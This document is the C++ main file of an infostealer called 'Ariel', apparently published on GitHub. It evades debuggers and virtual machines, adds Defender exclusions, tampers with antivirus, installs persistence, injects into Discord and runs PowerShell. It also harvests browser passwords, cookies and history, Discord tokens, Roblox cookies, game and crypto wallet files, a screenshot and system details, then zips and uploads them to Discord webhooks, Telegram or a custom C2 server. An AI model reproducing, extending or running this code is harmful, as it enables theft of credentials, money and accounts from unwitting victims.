#include "antivirus.hpp"
#include "archive.hpp"
#include "browser.hpp"
#include "collectors.hpp"
#include "config.hpp"
#include "discord.hpp"
#include "evasion.hpp"
#include "injection.hpp"
#include "net.hpp"
#include "persist.hpp"
#include "screenshot.hpp"
#include "script.hpp"
#include "util.hpp"

#include <windows.h>

#include <chrono>
#include <cstdio>
#include <ctime>
#include <fstream>
#include <iostream>
#include <map>
#include <string>
#include <thread>
#include <vector>

using namespace ariel;

namespace {

std::string registry_string(const HKEY root, const wchar_t* key, const wchar_t* value) {
    HKEY handle = nullptr;
    if (RegOpenKeyExW(root, key, 0, KEY_READ, &handle) != ERROR_SUCCESS) return {};
    wchar_t buffer[1024]{};
    DWORD size = sizeof(buffer);
    DWORD type = 0;
    std::string result;
    if (RegQueryValueExW(handle, value, nullptr, &type, reinterpret_cast<BYTE*>(buffer), &size) ==
        ERROR_SUCCESS)
        result = util::to_utf8(buffer);
    RegCloseKey(handle);
    return result;
}

std::string host_name() {
    wchar_t host[256]{};
    DWORD length = 256;
    GetComputerNameW(host, &length);
    return util::to_utf8(host);
}

std::string safe_host_name(const std::string& value) {
    std::string result = value;
    for (char& c : result) {
        const bool allowed = (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
                             (c >= '0' && c <= '9') || c == '-' || c == '_';
        if (!allowed) c = '_';
    }
    return result.empty() ? "host" : result;
}

std::string safe_component(const std::string& value) {
    std::string result = value;
    for (char& c : result) {
        const bool allowed = (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
                             (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.';
        if (!allowed) c = '_';
    }
    if (result.empty() || result == "." || result == "..") return "unknown";
    return result;
}

std::string os_info() {
    const wchar_t* key = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
    const std::string product = registry_string(HKEY_LOCAL_MACHINE, key, L"ProductName");
    const std::string display = registry_string(HKEY_LOCAL_MACHINE, key, L"DisplayVersion");
    const std::string build = registry_string(HKEY_LOCAL_MACHINE, key, L"CurrentBuild");
    const std::string ubr = registry_string(HKEY_LOCAL_MACHINE, key, L"UBR");
    std::string result = product.empty() ? "Windows" : product;
    if (!display.empty()) result += " " + display;
    if (!build.empty()) result += " (build " + build + (ubr.empty() ? "" : "." + ubr) + ")";
    return result;
}

std::string cpu_info() {
    const std::string name = registry_string(
        HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
        L"ProcessorNameString");
    return name.empty() ? "-" : name;
}

std::string ram_info() {
    MEMORYSTATUSEX status{};
    status.dwLength = sizeof(status);
    if (!GlobalMemoryStatusEx(&status)) return "-";
    const auto total = status.ullTotalPhys / (1024ull * 1024ull * 1024ull);
    return std::to_string(total) + " GB (" + std::to_string(status.dwMemoryLoad) + "% used)";
}

std::string display_info() {
    return std::to_string(GetSystemMetrics(SM_CXSCREEN)) + "x" +
           std::to_string(GetSystemMetrics(SM_CYSCREEN));
}

std::string domain_info() {
    wchar_t domain[256]{};
    DWORD length = 256;
    if (GetComputerNameExW(ComputerNameDnsDomain, domain, &length) && domain[0])
        return util::to_utf8(domain);
    return "workgroup";
}

std::string architecture_info() {
    SYSTEM_INFO info{};
    GetNativeSystemInfo(&info);
    switch (info.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64: return "x64";
        case PROCESSOR_ARCHITECTURE_INTEL: return "x86";
        case PROCESSOR_ARCHITECTURE_ARM64: return "arm64";
        default: return "other";
    }
}

std::string timezone_info() {
    TIME_ZONE_INFORMATION info{};
    if (GetTimeZoneInformation(&info) == TIME_ZONE_ID_INVALID) return "-";
    const std::string name = util::to_utf8(info.StandardName);
    return name.empty() ? "-" : name;
}

std::string system_info() {
    wchar_t user[256]{};
    DWORD user_length = 256;
    GetUserNameW(user, &user_length);

    const std::time_t now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
    std::tm local{};
    localtime_s(&local, &now);
    char stamp[64]{};
    std::strftime(stamp, sizeof(stamp), "%Y-%m-%d %H:%M:%S", &local);

    return "user: " + util::to_utf8(user) + "\nhost: " + host_name() +
           "\ndomain: " + domain_info() +
           "\nlocal time: " + stamp +
           "\nos: " + os_info() +
           "\ncpu: " + cpu_info() +
           "\nram: " + ram_info() +
           "\ndisplay: " + display_info() +
           "\narchitecture: " + architecture_info() +
           "\ntimezone: " + timezone_info() + "\n";
}

std::string system_value(const std::string& text, const std::string& key) {
    const std::string marker = key + ": ";
    const size_t position = text.find(marker);
    if (position == std::string::npos) return {};
    const size_t start = position + marker.size();
    const size_t end = text.find('\n', start);
    return text.substr(start, end == std::string::npos ? std::string::npos : end - start);
}

std::map<std::string, std::string> credential_files(
    const std::vector<browser::record>& records) {
    std::map<std::string, std::string> files;
    for (const auto& record : records) {
        const bool history = record.type == "history";
        const std::string kind = history ? "history" :
                                 (record.type == "cookie" ? "cookies" : "passwords");
        const std::string name = "credentials/" + safe_component(record.browser) + "/" +
                                 safe_component(record.profile) + "/" + kind + ".txt";
        std::string& text = files[name];
        if (text.empty()) {
            text += "browser: " + record.browser + "\n";
            text += "profile: " + record.profile + "\n";
            text += "type: " + kind + "\n\n";
        }
        if (history) {
            text += "url: " + util::printable(record.origin) + "\n";
            text += "title: " + util::printable(record.username) + "\n";
            text += "details: " + util::printable(record.secret) + "\n\n";
        } else {
            text += "origin: " + util::printable(record.origin) + "\n";
            text += "username: " + util::printable(record.username) + "\n";
            text += "secret: " + util::printable(record.secret) + "\n\n";
        }
    }
    return files;
}

std::vector<uint8_t> as_bytes(const std::string& value);

void write_text_entries(const util::fs::path& root,
                        const std::map<std::string, std::string>& files,
                        std::vector<archive::entry>& entries) {
    for (const auto& [name, text] : files) {
        const auto path = root / util::fs::path(name);
        std::error_code error;
        util::fs::create_directories(path.parent_path(), error);
        util::write_text(path, text);
        entries.push_back({name, as_bytes(text)});
    }
}

std::string tokens_text(const std::vector<discord::hit>& tokens,
                        const std::vector<net::discord_account>& accounts) {
    std::string out = "Discord tokens\n";
    out += "by ihateapples on github\n\n";
    size_t valid = 0;
    for (const auto& account : accounts)
        if (account.valid) ++valid;
    out += "tokens: " + std::to_string(tokens.size()) + "\n";
    out += "valid accounts: " + std::to_string(valid) + "\n\n";

    for (size_t i = 0; i < tokens.size(); ++i) {
        out += "[" + std::to_string(i + 1) + "]\n";
        out += "source: " + tokens[i].source + "\n";
        out += "token: " + tokens[i].token + "\n";
        if (i < accounts.size()) {
            std::string details = net::describe_account(accounts[i], true);
            const size_t first = details.find('\n');
            if (first != std::string::npos) {
                const size_t second = details.find('\n', first + 1);
                if (second != std::string::npos) out += details.substr(second + 1);
            }
        }
        out += "\n";
    }
    return out;
}

std::string accounts_text(const std::vector<net::discord_account>& accounts) {
    std::string out = "Discord token check\n";
    out += "by ihateapples on github\n\n";
    size_t valid = 0;
    for (const auto& account : accounts)
        if (account.valid) ++valid;
    out += "valid accounts: " + std::to_string(valid) + "\n";
    out += "tokens checked: " + std::to_string(accounts.size()) + "\n\n";
    for (const auto& account : accounts) {
        out += net::describe_account(account);
        out += "\n";
    }
    return out;
}

std::string summary_text(const size_t records,
                        const size_t tokens,
                        const size_t valid_accounts,
                        const std::vector<std::string>& warnings,
                        const config::options& options) {
    std::string out = "Ariel data summary\n";
    out += "by ihateapples on github\n";
    out += "records: " + std::to_string(records) + "\n";
    out += "discord tokens: " + std::to_string(tokens) + "\n";
    out += "valid discord accounts: " + std::to_string(valid_accounts) + "\n";
    out += "archive password: " + std::string(options.password.empty() ? "none" : "set") + "\n";
    out += "discord webhook: " + std::string(options.discord_webhook.empty() ? "none" : "configured") + "\n";
    out += "telegram bot: " + std::string(options.telegram_token.empty() ? "none" : "configured") + "\n";
    out += "startup install: " + std::string(options.install ? "on" : "off") + "\n";
    out += "defender exclusions: " + std::string(options.defender_exclusions ? "on" : "off") + "\n";
    out += "screenshot: " + std::string(options.screenshot ? "on" : "off") + "\n";
    out += "fake error: " + std::string(options.fake_error ? "on" : "off") + "\n";
    out += "discord injection: " + std::string(options.discord_injection ? "on" : "off") + "\n";
    out += "custom c2: " + std::string(options.custom_c2_url.empty() ? "none" : "configured") + "\n\n";
    for (const auto& warning : warnings) out += "! " + warning + "\n";
    return out;
}

std::vector<uint8_t> as_bytes(const std::string& value) {
    return std::vector<uint8_t>(value.begin(), value.end());
}

void enable_debug_console() {
    if (!AllocConsole() && GetLastError() != ERROR_ACCESS_DENIED) return;
    FILE* stream = nullptr;
    freopen_s(&stream, "CONIN$", "r", stdin);
    freopen_s(&stream, "CONOUT$", "w", stdout);
    freopen_s(&stream, "CONOUT$", "w", stderr);
    SetConsoleTitleW(L"Ariel debug");
    const HWND console = GetConsoleWindow();
    if (console) {
        ShowWindow(console, SW_RESTORE);
        SetForegroundWindow(console);
    }
    std::cout << "ariel debug console\n";
}

void debug_log(const config::options& options, const std::string& line) {
    if (!options.debug) return;
    std::cout << "[ariel] " << line << "\n";
    std::ofstream log(options.output / "debug_log.txt", std::ios::app);
    if (log) log << "[ariel] " << line << "\n";
}

void pause_debug(const config::options& options) {
    if (!options.debug) return;
    const HWND console = GetConsoleWindow();
    if (console) {
        ShowWindow(console, SW_RESTORE);
        SetForegroundWindow(console);
    }
    std::cout << "press enter to quit..." << std::endl;
    const HANDLE input = GetStdHandle(STD_INPUT_HANDLE);
    if (input != INVALID_HANDLE_VALUE) {
        DWORD mode = 0;
        if (GetConsoleMode(input, &mode))
            SetConsoleMode(input, mode | ENABLE_LINE_INPUT | ENABLE_ECHO_INPUT | ENABLE_PROCESSED_INPUT);
        wchar_t buffer[16]{};
        DWORD read = 0;
        if (ReadConsoleW(input, buffer, 16, &read, nullptr)) return;
    }
    MessageBoxW(nullptr, L"Debug finished. Press OK to exit.", L"Ariel debug", MB_OK);
}

void show_error(const config::options& options, const std::string& detail) {
    if (!options.debug) return;
    const auto text = util::from_utf8(detail);
    MessageBoxW(nullptr, text.c_str(), L"Ariel upload", MB_ICONERROR | MB_OK);
}

void cleanup_output(const config::options& options) {
    std::error_code error;
    util::fs::remove_all(options.output, error);
}

#if defined(_MSC_VER)
bool collect_chromium_safe(std::vector<browser::record>* out,
                           std::vector<std::string>* warnings) {
    __try {
        browser::collect_chromium_into(*out, *warnings);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
    return true;
}

bool collect_firefox_safe(std::vector<browser::record>* out,
                          std::vector<std::string>* warnings) {
    __try {
        browser::collect_firefox_into(*out, *warnings);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
    return true;
}

bool collect_discord_safe(std::vector<discord::hit>* out,
                          std::vector<std::string>* warnings) {
    __try {
        discord::collect_into(*out, *warnings);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
    return true;
}

bool collect_games_safe(std::vector<archive::entry>* out) {
    __try {
        collectors::games_into(*out);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
    return true;
}

bool collect_common_safe(std::vector<archive::entry>* out) {
    __try {
        collectors::common_files_into(*out);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
    return true;
}

bool collect_wallets_safe(std::vector<archive::entry>* out) {
    __try {
        collectors::wallets_into(*out);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
    return true;
}
#else
bool collect_chromium_safe(std::vector<browser::record>* out,
                           std::vector<std::string>* warnings) {
    browser::collect_chromium_into(*out, *warnings);
    return true;
}

bool collect_firefox_safe(std::vector<browser::record>* out,
                          std::vector<std::string>* warnings) {
    browser::collect_firefox_into(*out, *warnings);
    return true;
}

bool collect_discord_safe(std::vector<discord::hit>* out,
                          std::vector<std::string>* warnings) {
    discord::collect_into(*out, *warnings);
    return true;
}

bool collect_games_safe(std::vector<archive::entry>* out) {
    *out = collectors::games();
    return true;
}

bool collect_common_safe(std::vector<archive::entry>* out) {
    *out = collectors::common_files();
    return true;
}

bool collect_wallets_safe(std::vector<archive::entry>* out) {
    *out = collectors::wallets();
    return true;
}
#endif

}  // namespace

int wmain(const int argc, wchar_t** argv) {
    std::string error;
    const auto options = config::load(argc, argv, error);
    if (!error.empty()) {
        std::cerr << "config: " << error << "\n";
        return 1;
    }

    if (options.debug) {
        std::error_code log_dir_error;
        util::fs::create_directories(options.output, log_dir_error);
        enable_debug_console();
    }
    debug_log(options, "config loaded");

    if (options.anti_debug && evasion::anti_debug()) return 0;
    std::string vm_reason;
    if (options.anti_vm && evasion::anti_vm(&vm_reason)) {
        debug_log(options, "anti-vm: " + vm_reason);
        evasion::show_vm_message();
        return 0;
    }

    if (options.fake_error) {
        const auto title = util::from_utf8(options.fake_error_title.empty() ? "Error"
                                                                            : options.fake_error_title);
        const auto message = util::from_utf8(options.fake_error_message);
        std::thread([title, message]() {
            MessageBoxW(nullptr, message.c_str(), title.c_str(), MB_ICONERROR | MB_OK);
        }).detach();
    }

    if (options.defender_exclusions) {
        wchar_t executable[MAX_PATH]{};
        GetModuleFileNameW(nullptr, executable, MAX_PATH);
        const auto executable_dir = util::fs::path(executable).parent_path();
        const std::vector<util::fs::path> excluded = {
            util::fs::path(util::environment(L"TEMP")),
            executable_dir,
            options.output,
            persist::install_directory(options.appdata_dir),
        };
        std::string exclusion_error;
        if (!persist::add_defender_exclusions(excluded, exclusion_error))
            debug_log(options, "defender: " + exclusion_error);
        else
            debug_log(options, "defender exclusions done");
    }

    if (options.disable_av) {
        debug_log(options, antivirus::run() ? "av tamper done" : "av tamper needs admin");
    }

    if (options.install) {
        std::string persistence_error;
        if (!persist::install(options.startup_name, options.appdata_dir,
                              options.startup_method, persistence_error))
            debug_log(options, "startup: " + persistence_error);
        else
            debug_log(options, "startup installed");
    }

    if (!options.powershell_command.empty()) {
        std::string script_error;
        const auto script_result = script::run_powershell(
            options.powershell_command, options.powershell_every_run,
            options.appdata_dir, script_error);
        debug_log(options, "powershell: " +
                               (script_error.empty() ? script_result.detail : script_error));
    }

    if (options.discord_injection) {
        std::string injection_error;
        if (!injection::install(options.discord_webhook, options.injection_script, injection_error))
            debug_log(options, "discord injection: " + injection_error);
        else
            debug_log(options, "discord injection installed");
    }

    std::vector<std::string> warnings;
    std::vector<browser::record> records;
    std::vector<browser::record> firefox_records;
    std::vector<discord::hit> tokens;

    debug_log(options, "collecting chromium");
    if (!collect_chromium_safe(&records, &warnings))
        debug_log(options, "chromium collection crashed");
    else
        debug_log(options, "chromium done: " + std::to_string(records.size()));

    debug_log(options, "collecting firefox");
    if (!collect_firefox_safe(&firefox_records, &warnings))
        debug_log(options, "firefox collection crashed");
    else
        debug_log(options, "firefox done: " + std::to_string(firefox_records.size()));
    records.insert(records.end(), firefox_records.begin(), firefox_records.end());

    debug_log(options, "collecting discord tokens");
    if (!collect_discord_safe(&tokens, &warnings))
        debug_log(options, "discord token collection crashed");
    else
        debug_log(options, "discord tokens done: " + std::to_string(tokens.size()));

    std::vector<net::discord_token_input> token_inputs;
    token_inputs.reserve(tokens.size());
    for (const auto& token : tokens) token_inputs.push_back({token.source, token.token});

    debug_log(options, "checking discord tokens");
    const auto accounts = net::inspect_discord_tokens(token_inputs);
    size_t valid_accounts = 0;
    for (const auto& account : accounts)
        if (account.valid) ++valid_accounts;
    debug_log(options, "discord accounts: " + std::to_string(valid_accounts) + " valid of " +
                           std::to_string(accounts.size()));

    size_t roblox_host_cookies = 0;
    std::vector<net::roblox_cookie_input> roblox_inputs;
    for (const auto& record : records) {
        if (record.type != "cookie") continue;
        if (util::lower(record.origin).find("roblox.com") == std::string::npos) continue;
        ++roblox_host_cookies;
        if (util::lower(record.username).find("robloxsecurity") == std::string::npos) continue;
        roblox_inputs.push_back(
            {record.browser + "/" + record.profile, record.profile, record.secret});
    }
    debug_log(options, "roblox host cookies: " + std::to_string(roblox_host_cookies) +
                           ", candidates: " + std::to_string(roblox_inputs.size()));
    const auto roblox_accounts = net::inspect_roblox_cookies(roblox_inputs);
    size_t valid_roblox = 0;
    for (const auto& account : roblox_accounts)
        if (account.valid) ++valid_roblox;
    debug_log(options, "roblox cookies: " + std::to_string(valid_roblox) + " valid of " +
                           std::to_string(roblox_inputs.size()));

    for (const auto& warning : warnings) debug_log(options, "warning: " + warning);
    debug_log(options, "collected " + std::to_string(records.size()) + " records and " +
                           std::to_string(tokens.size()) + " discord tokens");

    std::error_code filesystem_error;
    util::fs::create_directories(options.output, filesystem_error);
    util::fs::remove(options.output / "credentials.csv", filesystem_error);

    std::vector<uint8_t> screenshot_bytes;
    if (options.screenshot) {
        const auto shot = screenshot::capture_desktop();
        if (shot.ok) {
            screenshot_bytes = shot.data;
            std::ofstream image(options.output / "screenshot.png",
                                std::ios::binary | std::ios::trunc);
            if (image)
                image.write(reinterpret_cast<const char*>(screenshot_bytes.data()),
                            static_cast<std::streamsize>(screenshot_bytes.size()));
        } else {
            debug_log(options, "screenshot: " + shot.error);
        }
    }

    std::vector<archive::entry> extra_entries;
    debug_log(options, "roblox files: start");
    const auto roblox_entries = collectors::roblox_cookies(roblox_accounts);
    extra_entries.insert(extra_entries.end(), roblox_entries.begin(), roblox_entries.end());
    debug_log(options, "roblox files: " + std::to_string(roblox_entries.size()));

    debug_log(options, "games files: start");
    std::vector<archive::entry> game_files;
    if (!collect_games_safe(&game_files)) debug_log(options, "games files: exception");
    debug_log(options, "games files: " + std::to_string(game_files.size()));
    extra_entries.insert(extra_entries.end(), game_files.begin(), game_files.end());

    debug_log(options, "common files: start");
    std::vector<archive::entry> keyword_files;
    if (!collect_common_safe(&keyword_files)) debug_log(options, "common files: exception");
    debug_log(options, "common files: " + std::to_string(keyword_files.size()));
    extra_entries.insert(extra_entries.end(), keyword_files.begin(), keyword_files.end());

    debug_log(options, "wallet files: start");
    std::vector<archive::entry> wallet_files;
    if (!collect_wallets_safe(&wallet_files)) debug_log(options, "wallet files: exception");
    debug_log(options, "wallet files: " + std::to_string(wallet_files.size()));
    extra_entries.insert(extra_entries.end(), wallet_files.begin(), wallet_files.end());

    const auto credential_map = credential_files(records);
    const std::string token_dump = tokens_text(tokens, accounts);
    const std::string account_dump = accounts_text(accounts);
    const std::string system = system_info();
    std::string summary =
        summary_text(records.size(), tokens.size(), valid_accounts, warnings, options);
    summary += "extra files: " + std::to_string(extra_entries.size()) + "\n";
    summary += "roblox cookies: " + std::to_string(valid_roblox) + " valid of " +
               std::to_string(roblox_accounts.size()) + "\n";

    std::vector<archive::entry> entries = {
        {"discord_tokens.txt", as_bytes(token_dump)},
        {"discord_accounts.txt", as_bytes(account_dump)},
        {"system_info.txt", as_bytes(system)},
        {"summary.txt", as_bytes(summary)},
    };
    write_text_entries(options.output, credential_map, entries);
    entries.insert(entries.end(), extra_entries.begin(), extra_entries.end());

    util::write_text(options.output / "discord_tokens.txt", token_dump);
    util::write_text(options.output / "discord_accounts.txt", account_dump);
    util::write_text(options.output / "system_info.txt", system);
    util::write_text(options.output / "summary.txt", summary);
    if (!screenshot_bytes.empty())
        entries.push_back({"screenshot.png", screenshot_bytes});

    const auto archive_path = options.output /
                              ("ariel-" + safe_host_name(host_name()) + ".zip");
    debug_log(options, "archive: start with " + std::to_string(entries.size()) + " entries");
    if (!archive::write_zip(archive_path, entries, options.password, error)) {
        debug_log(options, "archive: " + error);
        show_error(options, "archive: " + error);
        pause_debug(options);
        cleanup_output(options);
        return 2;
    }
    debug_log(options, "archive written");

    std::vector<std::string> upload_results;
    if (!options.discord_webhook.empty()) {
        debug_log(options, "upload: discord start");
        net::discord_report embed_info;
        embed_info.user = system_value(system, "user");
        embed_info.host = system_value(system, "host");
        embed_info.local_time = system_value(system, "local time");
        embed_info.os = system_value(system, "os");
        embed_info.cpu = system_value(system, "cpu");
        embed_info.ram = system_value(system, "ram");
        embed_info.display = system_value(system, "display");
        embed_info.domain = system_value(system, "domain");
        embed_info.credentials = records.size();
        embed_info.tokens = tokens.size();
        embed_info.ping_everyone = options.ping_everyone;
        embed_info.accounts = accounts;
        embed_info.thumbnail_url = options.thumbnail_url;

        const auto screenshot_path = screenshot_bytes.empty()
                                         ? util::fs::path{}
                                         : options.output / "screenshot.png";
        const auto result = net::send_discord(options.discord_webhook, archive_path,
                                              options.password, screenshot_path, embed_info);
        upload_results.push_back("discord: " + std::string(result.ok ? "ok" : "failed") + " " +
                                 result.detail);
    }
    if (!options.telegram_token.empty() && !options.telegram_chat_id.empty()) {
        debug_log(options, "upload: telegram start");
        const auto result = net::send_telegram(options.telegram_token, options.telegram_chat_id,
                                              archive_path, options.password);
        upload_results.push_back("telegram: " + std::string(result.ok ? "ok" : "failed") + " " +
                                 result.detail);
    }
    if (!options.custom_c2_url.empty()) {
        debug_log(options, "upload: custom c2 start");
        const auto result = net::send_custom(options.custom_c2_url,
                                             options.custom_c2_file_field,
                                             options.custom_c2_headers,
                                             options.custom_c2_fields,
                                             archive_path, options.password);
        upload_results.push_back("custom c2: " + std::string(result.ok ? "ok" : "failed") + " " +
                                 result.detail);
    }

    if (upload_results.empty()) debug_log(options, "upload: no destinations");
    std::string upload_log;
    for (const auto& line : upload_results) {
        upload_log += line + "\n";
        debug_log(options, line);
    }
    util::write_text(options.output / "upload_status.txt", upload_log);

    for (const auto& line : upload_results) {
        if (line.find("failed") != std::string::npos) show_error(options, line);
    }

    debug_log(options, "done: " + util::narrow_path(archive_path));
    if (options.fake_error) std::this_thread::sleep_for(std::chrono::milliseconds(500));
    pause_debug(options);
    cleanup_output(options);
    return 0;
}
